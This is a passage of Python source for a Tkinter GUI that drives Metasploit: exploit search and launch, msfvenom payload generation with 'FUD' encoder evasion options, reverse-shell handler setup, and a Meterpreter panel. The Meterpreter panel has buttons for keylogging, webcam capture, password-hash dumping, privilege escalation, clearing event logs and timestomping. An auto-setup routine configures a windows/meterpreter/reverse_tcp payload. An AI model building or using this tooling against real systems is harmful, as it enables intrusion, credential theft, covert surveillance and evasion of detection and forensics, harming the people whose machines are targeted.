            font=("Consolas", 9),
            height=8
        )
        self.handler_status.pack(fill=tk.BOTH, expand=True)
    
    def create_commands_tab(self):
        """Create commands and help tab."""
        commands_frame = ttk.Frame(self.notebook, padding="8")
        self.notebook.add(commands_frame, text="Commands & Help")
        
        # Category selection
        category_frame = ttk.LabelFrame(commands_frame, text="Command Categories", padding="10")
        category_frame.pack(fill=tk.X, pady=(0, 10))
        
        categories = [
            "General", "Exploit", "Payload", "Auxiliary", "Post", "Session",
            "Database", "Resource", "Encoder", "NOP", "Evasion", "Meterpreter"
        ]
        
        self.command_category_var = tk.StringVar(value="General")
        for i, cat in enumerate(categories):
            rb = ttk.Radiobutton(
                category_frame,
                text=cat,
                variable=self.command_category_var,
                value=cat,
                command=self.update_commands_display
            )
            rb.grid(row=i // 4, column=i % 4, padx=5, pady=2, sticky=tk.W)
        
        # Commands display
        display_frame = ttk.LabelFrame(commands_frame, text="Commands", padding="5")
        display_frame.pack(fill=tk.BOTH, expand=True)
        
        self.commands_display = scrolledtext.ScrolledText(
            display_frame,
            wrap=tk.WORD,
            font=("Consolas", 9),
            height=15
        )
        self.commands_display.pack(fill=tk.BOTH, expand=True)
        
        # Load initial commands
        self.update_commands_display()
        
        # Quick help buttons
        help_frame = ttk.Frame(commands_frame)
        help_frame.pack(fill=tk.X, pady=(10, 0))
        
        help_btn = ttk.Button(
            help_frame,
            text="Show Full Help",
            command=self.show_full_help
        )
        help_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        version_btn = ttk.Button(
            help_frame,
            text="Show Version",
            command=self.show_version
        )
        version_btn.pack(side=tk.LEFT)
    
    def create_session_manager_tab(self):
        """Create session manager tab."""
        session_frame = ttk.Frame(self.notebook, padding="8")
        self.notebook.add(session_frame, text="Session Manager")
        
        list_frame = ttk.LabelFrame(session_frame, text="Active Sessions", padding="5")
        list_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        columns = ("ID", "Type", "Information", "Opened")
        self.session_tree = ttk.Treeview(list_frame, columns=columns, show="headings", height=8)
        
        for col in columns:
            self.session_tree.heading(col, text=col)
            self.session_tree.column(col, width=150)
        
        scrollbar = ttk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.session_tree.yview)
        self.session_tree.configure(yscrollcommand=scrollbar.set)
        
        self.session_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        action_frame = ttk.Frame(session_frame)
        action_frame.pack(fill=tk.X)
        
        refresh_btn = ttk.Button(
            action_frame,
            text="Refresh Sessions",
            command=self.refresh_sessions
        )
        refresh_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        interact_btn = ttk.Button(
            action_frame,
            text="Interact",
            command=self.interact_session
        )
        interact_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        kill_btn = ttk.Button(
            action_frame,
            text="Kill Session",
            command=self.kill_session
        )
        kill_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        upgrade_btn = ttk.Button(
            action_frame,
            text="Upgrade to Meterpreter",
            command=self.upgrade_session
        )
        upgrade_btn.pack(side=tk.LEFT)
    
    def create_meterpreter_tab(self):
        """Create Meterpreter management tab."""
        meterpreter_frame = ttk.Frame(self.notebook, padding="8")
        self.notebook.add(meterpreter_frame, text="Meterpreter Manager")
        
        # Session selection
        session_frame = ttk.LabelFrame(meterpreter_frame, text="Active Meterpreter Sessions", padding="5")
        session_frame.pack(fill=tk.BOTH, expand=False, pady=(0, 5))
        
        columns = ("ID", "Type", "Platform", "Arch", "User", "Info")
        self.meterpreter_tree = ttk.Treeview(session_frame, columns=columns, show="headings", height=5)
        
        for col in columns:
            self.meterpreter_tree.heading(col, text=col)
            self.meterpreter_tree.column(col, width=120)
        
        scrollbar = ttk.Scrollbar(session_frame, orient=tk.VERTICAL, command=self.meterpreter_tree.yview)
        self.meterpreter_tree.configure(yscrollcommand=scrollbar.set)
        
        self.meterpreter_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.meterpreter_tree.bind('<Double-1>', self.interact_meterpreter)
        
        # Session controls
        session_control_frame = ttk.Frame(meterpreter_frame)
        session_control_frame.pack(fill=tk.X, pady=(0, 5))
        
        refresh_meterpreter_btn = ttk.Button(
            session_control_frame,
            text="Refresh Sessions",
            command=self.refresh_meterpreter_sessions
        )
        refresh_meterpreter_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        interact_meterpreter_btn = ttk.Button(
            session_control_frame,
            text="Interact",
            command=self.interact_meterpreter
        )
        interact_meterpreter_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        # Meterpreter command input
        command_frame = ttk.LabelFrame(meterpreter_frame, text="Meterpreter Commands", padding="5")
        command_frame.pack(fill=tk.X, pady=(0, 5))
        
        input_container = ttk.Frame(command_frame)
        input_container.pack(fill=tk.X)
        
        ttk.Label(input_container, text="Command:").pack(side=tk.LEFT, padx=(0, 5))
        
        self.meterpreter_command_entry = ttk.Entry(input_container)
        self.meterpreter_command_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        self.meterpreter_command_entry.bind('<Return>', lambda e: self.send_meterpreter_command())
        
        send_meterpreter_btn = ttk.Button(
            input_container,
            text="Send",
            command=self.send_meterpreter_command
        )
        send_meterpreter_btn.pack(side=tk.RIGHT)
        
        # Quick commands - use a scrollable frame for better space management
        quick_cmds_frame = ttk.LabelFrame(meterpreter_frame, text="Quick Commands", padding="5")
        quick_cmds_frame.pack(fill=tk.BOTH, expand=False, pady=(0, 5))
        
        # Create a canvas for scrolling
        quick_canvas = tk.Canvas(quick_cmds_frame, height=100)
        quick_scrollbar = ttk.Scrollbar(quick_cmds_frame, orient="vertical", command=quick_canvas.yview)
        quick_scrollable_frame = ttk.Frame(quick_canvas)
        
        def on_frame_configure(event):
            quick_canvas.configure(scrollregion=quick_canvas.bbox("all"))
        
        quick_scrollable_frame.bind("<Configure>", on_frame_configure)
        
        quick_canvas.create_window((0, 0), window=quick_scrollable_frame, anchor="nw")
        quick_canvas.configure(yscrollcommand=quick_scrollbar.set)
        
        # Add mouse wheel support
        def on_mousewheel(event):
            quick_canvas.yview_scroll(int(-1 * (event.delta / 120)), "units")
        
        quick_canvas.bind("<MouseWheel>", on_mousewheel)
        quick_scrollable_frame.bind("<MouseWheel>", on_mousewheel)
        
        quick_meterpreter_commands = [
            ("sysinfo", "sysinfo"),
            ("getuid", "getuid"),
            ("pwd", "pwd"),
            ("ls", "ls"),
            ("ps", "ps"),
            ("shell", "shell"),
            ("background", "background"),
            ("screenshot", "screenshot"),
            ("webcam_snap", "webcam_snap"),
            ("keyscan_start", "keyscan_start"),
            ("keyscan_dump", "keyscan_dump"),
            ("keyscan_stop", "keyscan_stop"),
            ("upload", "upload"),
            ("download", "download"),
            ("migrate", "migrate"),
            ("hashdump", "hashdump"),
            ("getsystem", "getsystem"),
            ("clearev", "clearev"),
            ("timestomp", "timestomp"),
            ("smart_hashdump", "run post/windows/gather/smart_hashdump"),
        ]
        
        for i, (label, cmd) in enumerate(quick_meterpreter_commands):
            btn = ttk.Button(
                quick_scrollable_frame,
                text=label,
                command=lambda c=cmd: self.quick_meterpreter_command(c),
                width=18
            )
            btn.grid(row=i // 6, column=i % 6, padx=2, pady=1, sticky=(tk.W, tk.E))
        
        for col in range(6):
            quick_scrollable_frame.columnconfigure(col, weight=1)
        
        quick_canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        quick_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # File operations - use a more compact layout
        file_frame = ttk.LabelFrame(meterpreter_frame, text="File Operations", padding="5")
        file_frame.pack(fill=tk.X, pady=(0, 5))
        
        # Upload section
        upload_frame = ttk.Frame(file_frame)
        upload_frame.pack(fill=tk.X, pady=(0, 3))
        
        ttk.Label(upload_frame, text="Upload:", width=10).pack(side=tk.LEFT, padx=(0, 5))
        self.meterpreter_local_file = ttk.Entry(upload_frame, width=35)
        self.meterpreter_local_file.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        
        browse_local_btn = ttk.Button(
            upload_frame,
            text="Browse",
            command=self.browse_meterpreter_local_file
        )
        browse_local_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Label(upload_frame, text="→", width=2).pack(side=tk.LEFT, padx=(0, 5))
        self.meterpreter_remote_path = ttk.Entry(upload_frame, width=35)
        self.meterpreter_remote_path.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        
        upload_btn = ttk.Button(
            upload_frame,
            text="Upload",
            command=self.meterpreter_upload_file
        )
        upload_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        download_btn = ttk.Button(
            upload_frame,
            text="Download",
            command=self.meterpreter_download_file
        )
        download_btn.pack(side=tk.LEFT)
        
        # Output display
        output_frame = ttk.LabelFrame(meterpreter_frame, text="Meterpreter Output", padding="5")
        output_frame.pack(fill=tk.BOTH, expand=True)
        
        self.meterpreter_output = scrolledtext.ScrolledText(
            output_frame,
            wrap=tk.WORD,
            font=("Consolas", 9),
            height=8
        )
        self.meterpreter_output.pack(fill=tk.BOTH, expand=True)
        
        self.meterpreter_output.tag_config("output", foreground="#d4d4d4")
        self.meterpreter_output.tag_config("error", foreground="#f48771")
        self.meterpreter_output.tag_config("success", foreground="#4ec9b0")
        self.meterpreter_output.tag_config("warning", foreground="#dcdcaa")
    
    # Console methods
    def start_console(self):
        """Start Metasploit console."""
        if self.console and self.console.running:
            messagebox.showinfo("Info", "Console is already running.")
            return
        
        self.console = MetasploitConsole(output_callback=self.console_output_callback)
        if self.console.start():
            self.start_btn.config(state="disabled")
            self.stop_btn.config(state="normal")
            self.console_output_callback("Metasploit console started.\n", "success")
        else:
            messagebox.showerror("Error", "Failed to start Metasploit console.\nMake sure Metasploit Framework is installed.")
    
    def stop_console(self):
        """Stop Metasploit console."""
        if self.console:
            self.console.stop()
            self.console = None
            self.start_btn.config(state="normal")
            self.stop_btn.config(state="disabled")
            self.console_output_callback("Metasploit console stopped.\n", "warning")
    
    def console_output_callback(self, text, tag="output"):
        """Callback for console output."""
        def _update():
            self.console_output.insert(tk.END, text, tag)
            self.console_output.see(tk.END)
            
            # Parse search results if we're in search mode
            if self.active_search:
                self._parse_search_output(text)
        
        self.root.after(0, _update)
    
    def _parse_search_output(self, text):
        """Parse Metasploit search output and populate treeviews."""
        if not self.active_search:
            return
        
        # Add to buffer
        self.search_output_buffer.append(text)
        
        # For "show" commands, look for module list format (different from search)
        if self.is_show_command:
            # "show" commands typically list modules directly, look for module paths
            if re.search(r'exploit/|auxiliary/|payload/|encoder/|nop/|post/|evasion/', text):
                self.search_parsing = True
                # Cancel any existing timeout
                if self.search_timeout_id:
                    self.root.after_cancel(self.search_timeout_id)
                # Set a timeout to process results if no prompt is seen
                self.search_timeout_id = self.root.after(2000, self._process_search_results)
            # Process when we see a prompt - be more lenient with prompt detection
            if re.search(r'msf[56]?\s*>', text) or re.search(r'msf[56]?\s*\[', text) or re.search(r'^\s*>\s*$', text):
                # Cancel timeout since we got a prompt
                if self.search_timeout_id:
                    self.root.after_cancel(self.search_timeout_id)
                    self.search_timeout_id = None
                # Give a small delay to ensure all output is captured
                self.root.after(200, lambda: self._process_search_results() if self.search_parsing else None)
                return
        
        # For "search" commands, look for "Matching Modules" header
        if "Matching Modules" in text:
            self.search_parsing = True
            return
        
        # Check for no results
        if "No results" in text or "No matching modules" in text:
            self._process_search_results()
            return
        
        # Check if we've reached the end of search results
        # Metasploit search typically ends with a prompt
        if re.search(r'msf[56]?\s*>', text) or re.search(r'msf[56]?\s*\[', text):
            # We've reached a prompt, process the buffer
            if self.search_parsing or len(self.search_output_buffer) > 1:
                self._process_search_results()
            return
    
    def _process_search_results(self):
        """Process collected search output and populate appropriate treeview."""
        if not self.active_search or not self.search_output_buffer:
            return
        
        # Cancel any pending timeout
        if self.search_timeout_id:
            self.root.after_cancel(self.search_timeout_id)
            self.search_timeout_id = None
        
        # Join all buffered output
        full_output = ''.join(self.search_output_buffer)
        
        # Save is_show_command flag before resetting
        is_show = self.is_show_command
        
        # Clear the buffer
        self.search_output_buffer = []
        self.search_parsing = False
        self.is_show_command = False
        
        # Parse based on active search type
        if self.active_search == 'exploit':
            self._populate_exploit_tree(full_output, is_show)
        elif self.active_search == 'auxiliary':
            self._populate_auxiliary_tree(full_output, is_show)
        
        # Clear active search
        self.active_search = None
    
    def _populate_exploit_tree(self, output, is_show_command=False):
        """Parse exploit search results and populate exploit_tree."""
        # Clear existing items
        for item in self.exploit_tree.get_children():
            self.exploit_tree.delete(item)
        
        # Check for no results
        if "No results" in output or "No matching modules" in output or not output.strip():
            if not is_show_command or not re.search(r'exploit/', output):
                self.exploit_tree.insert("", tk.END, values=("No results found", "", ""))
                return
        
        # Parse Metasploit output format
        lines = output.split('\n')
        in_results = False
        header_passed = False
        
        for line in lines:
            stripped = line.strip()
            
            # Skip empty lines
            if not stripped:
                continue
            
            # Handle "show" command format (just module paths)
            if is_show_command:
                # Look for exploit module paths - handle both simple paths and paths with descriptions
                # Also handle lines that might have leading/trailing whitespace or other formatting
                if re.search(r'exploit/', stripped):
                    # Extract module name - could be at start or after some whitespace/numbers
                    match = re.search(r'(exploit/[^\s]+)', stripped)
                    if match:
                        name = match.group(1)
                        rank = ""
                        # Try to extract description (everything after the module path)
                        desc_match = re.search(r'exploit/[^\s]+\s+(.+)', stripped)
                        description = desc_match.group(1) if desc_match else ""
                        self.exploit_tree.insert("", tk.END, values=(name, rank, description))
                continue
            
            # Handle "search" command format
            # Skip until we see "Matching Modules"
            if "Matching Modules" in line:
                in_results = True
                continue
            
            if not in_results:
                continue
            
            # Skip separator lines
            if "===" in line or "----" in line:
                header_passed = True
                continue
            
            if not header_passed or not stripped:
                continue
            
            # Parse result line: number, name, date, rank, check, description
            # Format: "  0  exploit/path/name  date  rank  check  description"
            if re.match(r'^\d+', stripped):
                parts = stripped.split()
                if len(parts) >= 2:
                    name = parts[1]
                    rank = parts[4] if len(parts) > 4 else ""
                    # Description is everything after rank (or check if present)
                    desc_start = 6 if len(parts) > 5 and parts[5] in ['Yes', 'No'] else 5
                    description = ' '.join(parts[desc_start:]) if len(parts) > desc_start else ""
                    
                    self.exploit_tree.insert("", tk.END, values=(name, rank, description))
    
    def _populate_auxiliary_tree(self, output, is_show_command=False):
        """Parse module search results and populate aux_tree."""
        # Clear existing items
        for item in self.aux_tree.get_children():
            self.aux_tree.delete(item)
        
        # Check for no results
        if "No results" in output or "No matching modules" in output or not output.strip():
            if not is_show_command or not re.search(r'(exploit|auxiliary|payload|encoder|nop|post|evasion)/', output):
                self.aux_tree.insert("", tk.END, values=("No results found", "", ""))
                return
        
        # Parse Metasploit output format
        lines = output.split('\n')
        in_results = False
        header_passed = False
        
        for line in lines:
            stripped = line.strip()
            
            # Skip empty lines
            if not stripped:
                continue
            
            # Handle "show" command format (just module paths)
            if is_show_command:
                # Look for module paths - check for any module type
                # Use search instead of match to find module paths anywhere in the line
                match = re.search(r'((exploit|auxiliary|payload|encoder|nop|post|evasion)/[^\s]+)', stripped)
                if match:
                    name = match.group(1)
                    # Extract module type from name
                    module_type = "unknown"
                    if '/' in name:
                        module_type = name.split('/')[0]
                    # Try to extract description (everything after the module path)
                    desc_match = re.search(r'(exploit|auxiliary|payload|encoder|nop|post|evasion)/[^\s]+\s+(.+)', stripped)
                    description = desc_match.group(2) if desc_match else ""
                    self.aux_tree.insert("", tk.END, values=(name, module_type, description))
                continue
            
            # Handle "search" command format
            # Skip until we see "Matching Modules"
            if "Matching Modules" in line:
                in_results = True
                continue
            
            if not in_results:
                continue
            
            # Skip separator lines
            if "===" in line or "----" in line:
                header_passed = True
                continue
            
            if not header_passed or not stripped:
                continue
            
            # Parse result line
            if re.match(r'^\d+', stripped):
                parts = stripped.split()
                if len(parts) >= 2:
                    name = parts[1]
                    
                    # Extract module type from name (e.g., "exploit/...", "auxiliary/...", etc.)
                    module_type = "unknown"
                    if '/' in name:
                        module_type = name.split('/')[0]
                    
                    # Description is everything after rank (or check if present)
                    desc_start = 6 if len(parts) > 5 and parts[5] in ['Yes', 'No'] else 5
                    description = ' '.join(parts[desc_start:]) if len(parts) > desc_start else ""
                    
                    self.aux_tree.insert("", tk.END, values=(name, module_type, description))
    
    def send_console_command(self, event=None):
        """Send command to console."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        command = self.command_entry.get().strip()
        if not command:
            return
        
        self.console_output_callback(f"msf6 > {command}\n", "output")
        
        if self.console.send_command(command):
            self.command_entry.delete(0, tk.END)
        else:
            self.console_output_callback("Failed to send command.\n", "error")
    
    def quick_command(self, command):
        """Send quick command."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        self.command_entry.delete(0, tk.END)
        self.command_entry.insert(0, command)
        self.send_console_command()
    
    def clear_console(self):
        """Clear console output."""
        self.console_output.delete(1.0, tk.END)
    
    # Exploit methods
    def search_exploits(self):
        """Search for exploits."""
        query = self.exploit_search_entry.get().strip()
        if not query:
            messagebox.showwarning("Warning", "Please enter a search query.")
            return
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        # Clear previous results
        for item in self.exploit_tree.get_children():
            self.exploit_tree.delete(item)
        
        # Set search state
        self.active_search = 'exploit'
        self.search_output_buffer = []
        self.search_parsing = False
        self.is_show_command = False
        
        # Insert placeholder
        self.exploit_tree.insert("", tk.END, values=("Searching...", "Please wait", ""))
        
        command = f"search type:exploit {query}"
        self.console.send_command(command)
        self.console_output_callback(f"Searching for exploits: {query}\n", "output")
    
    def show_all_exploits(self):
        """Show all exploits."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        # Clear previous results
        for item in self.exploit_tree.get_children():
            self.exploit_tree.delete(item)
        
        # Set search state
        self.active_search = 'exploit'
        self.search_output_buffer = []
        self.search_parsing = False
        self.is_show_command = True
        
        # Insert placeholder
        self.exploit_tree.insert("", tk.END, values=("Loading...", "Please wait", ""))
        
        self.console.send_command("show exploits")
        self.console_output_callback("Showing all exploits...\n", "output")
    
    def use_exploit(self, event=None):
        """Use selected exploit."""
        selection = self.exploit_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select an exploit.")
            return
        
        item = self.exploit_tree.item(selection[0])
        exploit_name = item['values'][0]
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        command = f"use {exploit_name}"
        self.console.send_command(command)
        self.console_output_callback(f"Using exploit: {exploit_name}\n", "success")
    
    def show_exploit_info(self):
        """Show exploit information."""
        selection = self.exploit_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select an exploit.")
            return
        
        item = self.exploit_tree.item(selection[0])
        exploit_name = item['values'][0]
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        command = f"info {exploit_name}"
        self.console.send_command(command)
        self.console_output_callback(f"Showing info for: {exploit_name}\n", "output")
    
    def show_exploit_options(self):
        """Show exploit options."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        self.console.send_command("show options")
        self.console_output_callback("Showing exploit options...\n", "output")
    
    def auto_setup_exploit(self):
        """Automatically setup exploit with common options."""
        selection = self.exploit_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select an exploit first.")
            return
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        item = self.exploit_tree.item(selection[0])
        exploit_name = item['values'][0]
        
        # Use exploit
        self.console.send_command(f"use {exploit_name}")
        self.console_output_callback(f"Using exploit: {exploit_name}\n", "success")
        
        # Show options and set common values
        self.console.send_command("show options")
        self.console_output_callback("Auto-setting common options...\n", "output")
        
        # Common options (user can modify after)
        self.console.send_command("set LHOST 0.0.0.0")
        self.console.send_command("set LPORT 4444")
        self.console.send_command("set payload windows/meterpreter/reverse_tcp")
        
        self.console_output_callback("Auto-setup complete. Check options and adjust as needed.\n", "success")
    
    # Payload methods
    def browse_save_location(self):
        """Browse for payload save location."""
        directory = filedialog.askdirectory(initialdir=self.payload_save_path)
        if directory:
            self.payload_save_path = directory
            self.save_path_var.set(directory)
    
    def generate_payload(self):
        """Generate payload with FUD options."""
        payload_type = self.payload_type.get()
        lhost = self.lhost_entry.get().strip()
        lport = self.lport_entry.get().strip()
        format_type = self.format_var.get()
        
        if not lhost or not lport:
            messagebox.showwarning("Warning", "Please fill in all required fields.")
            return
        
        # Find msfvenom on the system
        msfvenom_path = shutil.which('msfvenom')
        if not msfvenom_path:
            # Check common installation locations
            for path in [
                '/usr/bin/msfvenom',
                '/opt/metasploit-framework/msfvenom',
                '/usr/local/bin/msfvenom',
                '/usr/share/metasploit-framework/msfvenom',
                os.path.expanduser('~/metasploit-framework/msfvenom'),
            ]:
                if os.path.exists(path) and os.access(path, os.X_OK):
                    msfvenom_path = path
                    break
        
        if not msfvenom_path:
            messagebox.showerror("Error", "msfvenom not found. Please install Metasploit Framework.")
            return
        
        try:
            cmd = [
                msfvenom_path,
                '-p', payload_type,
                'LHOST=' + lhost,
                'LPORT=' + lport,
                '-f', format_type
            ]
            
            # Add FUD options
            if self.fud_enabled.get():
                encoder = self.encoder_var.get()
                iterations = self.iterations_var.get()
                badchars = self.badchars_entry.get().strip()
                
                cmd.extend(['-e', encoder])
                cmd.extend(['-i', iterations])
                
                if badchars:
                    cmd.extend(['-b', badchars])
            
            # Output file
            save_path = self.save_path_var.get()
            if not os.path.exists(save_path):
                os.makedirs(save_path, exist_ok=True)
            
            # Generate filename based on payload type
            filename = payload_type.replace('/', '_').replace('\\', '_') + '.' + format_type
            output_file = os.path.join(save_path, filename)
            cmd.extend(['-o', output_file])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                self.payload_output.delete(1.0, tk.END)
                output_text = f"Payload generated successfully!\n"
                output_text += f"File saved to: {output_file}\n\n"
                output_text += result.stdout
                self.payload_output.insert(1.0, output_text)
                self.console_output_callback(f"Payload generated: {payload_type}\n", "success")
                messagebox.showinfo("Success", f"Payload saved to:\n{output_file}")
            else:
                error_msg = result.stderr or result.stdout
                messagebox.showerror("Error", f"Failed to generate payload:\n{error_msg}")
        except Exception as e:
            messagebox.showerror("Error", f"Error generating payload: {str(e)}")
    
    def save_payload_to_file(self):
        """Save payload to user-specified file."""
        payload = self.payload_output.get(1.0, tk.END).strip()
        if not payload:
            messagebox.showwarning("Warning", "No payload to save.")
            return
        
        filename = filedialog.asksaveasfilename(
            initialdir=self.payload_save_path,
            defaultextension=".txt",
            filetypes=[
                ("All files", "*.*"),
                ("Executable", "*.exe"),
                ("Text files", "*.txt"),
                ("Python", "*.py"),
                ("Bash", "*.sh")
            ]
        )
        
        if filename:
            try:
                with open(filename, 'wb') as f:
                    # Try to decode if it's text, otherwise write binary
                    try:
                        f.write(payload.encode())
                    except:
                        f.write(payload)
                messagebox.showinfo("Success", f"Payload saved to {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save payload: {str(e)}")
    
    # Auxiliary methods (now handles all module types)
    def search_auxiliary(self):
        """Search for modules by type."""
        query = self.aux_search_entry.get().strip()
        module_type = self.aux_module_type_var.get()
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        # Clear previous results
        for item in self.aux_tree.get_children():
            self.aux_tree.delete(item)
        
        # Set search state
        self.active_search = 'auxiliary'
        self.search_output_buffer = []
        self.search_parsing = False
        self.is_show_command = False
        
        # Insert placeholder
        self.aux_tree.insert("", tk.END, values=("Searching...", "Please wait", ""))
        
        if query:
            command = f"search type:{module_type} {query}"
        else:
            command = f"search type:{module_type}"
        
        self.console.send_command(command)
        self.console_output_callback(f"Searching for {module_type} modules: {query}\n", "output")
    
    def show_all_modules(self):
        """Show all modules of selected type."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        module_type = self.aux_module_type_var.get()
        
        # Clear previous results
        for item in self.aux_tree.get_children():
            self.aux_tree.delete(item)
        
        # Set search state
        self.active_search = 'auxiliary'
        self.search_output_buffer = []
        self.search_parsing = False
        self.is_show_command = True
        
        # Insert placeholder
        self.aux_tree.insert("", tk.END, values=("Loading...", "Please wait", ""))
        
        # Handle pluralization for show command
        if module_type == "post":
            command = "show post"
        else:
            command = f"show {module_type}s"
        
        self.console.send_command(command)
        self.console_output_callback(f"Showing all {module_type} modules...\n", "output")
    
    def use_auxiliary(self, event=None):
        """Use selected module."""
        selection = self.aux_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a module.")
            return
        
        item = self.aux_tree.item(selection[0])
        module_name = item['values'][0]
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        command = f"use {module_name}"
        self.console.send_command(command)
        self.console_output_callback(f"Using module: {module_name}\n", "success")
    
    def show_auxiliary_info(self):
        """Show module information."""
        selection = self.aux_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a module.")
            return
        
        item = self.aux_tree.item(selection[0])
        module_name = item['values'][0]
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        command = f"info {module_name}"
        self.console.send_command(command)
        self.console_output_callback(f"Showing info for: {module_name}\n", "output")
    
    def show_auxiliary_options(self):
        """Show module options."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        self.console.send_command("show options")
        self.console_output_callback("Showing module options...\n", "output")
    
    # Handler methods
    def setup_handler(self):
        """Setup handler with configured options."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        handler_type = self.handler_type_var.get()
        payload = self.handler_payload_var.get()
        lhost = self.handler_lhost_entry.get().strip()
        lport = self.handler_lport_entry.get().strip()
        
        if not lhost or not lport:
            messagebox.showwarning("Warning", "Please fill in LHOST and LPORT.")
            return
        
        # Setup handler
        self.console.send_command(f"use {handler_type}")
        self.console.send_command(f"set PAYLOAD {payload}")
        self.console.send_command(f"set LHOST {lhost}")
        self.console.send_command(f"set LPORT {lport}")
        
        if self.auto_migrate_var.get():
            self.console.send_command("set AutoRunScript migrate -f")
        
        if self.exit_on_session_var.get():
            self.console.send_command("set ExitOnSession false")
        
        self.console.send_command("show options")
        
        status_text = f"Handler setup complete!\n"
        status_text += f"Type: {handler_type}\n"
        status_text += f"Payload: {payload}\n"
        status_text += f"LHOST: {lhost}\n"
        status_text += f"LPORT: {lport}\n"
        
        self.handler_status.delete(1.0, tk.END)
        self.handler_status.insert(1.0, status_text)
        
        self.console_output_callback("Handler setup complete.\n", "success")
    
    def start_handler(self):
        """Start the handler."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        self.console.send_command("exploit -j")
        self.handler_status.insert(tk.END, "\nHandler started in background (job mode).\n")
        self.console_output_callback("Handler started.\n", "success")
    
    def stop_handler(self):
        """Stop the handler."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        self.console.send_command("jobs -K")
        self.handler_status.insert(tk.END, "\nHandler stopped.\n")
        self.console_output_callback("Handler stopped.\n", "warning")
    
    # Commands and help methods
    def update_commands_display(self):
        """Update commands display based on category."""
        category = self.command_category_var.get()
        
        commands_text = f"=== {category} Commands ===\n\n"
        
        commands_dict = {
            "General": """help              - Show help menu
version           - Show version
banner            - Show banner
save              - Save current environment
load              - Load a plugin
exit              - Exit Metasploit
quit              - Quit Metasploit
irb               - Open Ruby shell
pry               - Open Pry debugger
history           - Show command history
sessions          - List active sessions
jobs              - List background jobs
""",
            "Exploit": """use <exploit>     - Use an exploit module
show exploits     - List all exploits
show options      - Show exploit options
set <option> <value> - Set an option
unset <option>    - Unset an option
run               - Run the exploit
exploit           - Run the exploit
check             - Check if target is vulnerable
""",
            "Payload": """show payloads     - List all payloads
set payload <payload> - Set payload
generate          - Generate payload
""",
            "Auxiliary": """use <auxiliary>  - Use an auxiliary module
show auxiliary    - List all auxiliary modules
run               - Run the auxiliary module
""",
            "Post": """use <post>        - Use a post-exploitation module
show post         - List all post modules
run               - Run the post module
""",
            "Session": """sessions -l       - List all sessions
sessions -i <id>  - Interact with session
sessions -k <id>  - Kill a session
sessions -u <id>  - Upgrade shell to meterpreter
sessions -s <script> - Run script on session
background        - Background current session
""",
            "Database": """db_connect        - Connect to database
db_disconnect     - Disconnect from database
db_status         - Show database status
workspace         - Manage workspaces
hosts             - List hosts
services          - List services
vulns             - List vulnerabilities
loot              - List loot
""",
            "Resource": """resource <file>  - Run resource script
makerc <file>     - Save commands to resource file
""",
            "Encoder": """show encoders     - List all encoders
use <encoder>     - Use an encoder
""",
            "NOP": """show nops          - List all NOP generators
use <nop>         - Use a NOP generator
""",
            "Evasion": """show evasion      - List all evasion modules
use <evasion>     - Use an evasion module
""",
            "Meterpreter": """sysinfo          - Show system information
getuid           - Get current user
getpid           - Get current process ID
pwd              - Print working directory
ls               - List files in current directory
cd <dir>         - Change directory
cat <file>       - Display file contents
download <file>  - Download file from remote system
upload <file>    - Upload file to remote system
rm <file>        - Delete file
mkdir <dir>      - Create directory
rmdir <dir>      - Remove directory
ps               - List running processes
kill <pid>       - Kill a process
shell            - Drop into system shell
background       - Background current session
screenshot       - Take a screenshot
webcam_snap      - Take webcam snapshot
webcam_stream    - Stream webcam
keyscan_start    - Start keylogger
keyscan_dump     - Dump captured keystrokes
keyscan_stop     - Stop keylogger
migrate <pid>    - Migrate to another process
getsystem        - Attempt to get system privileges
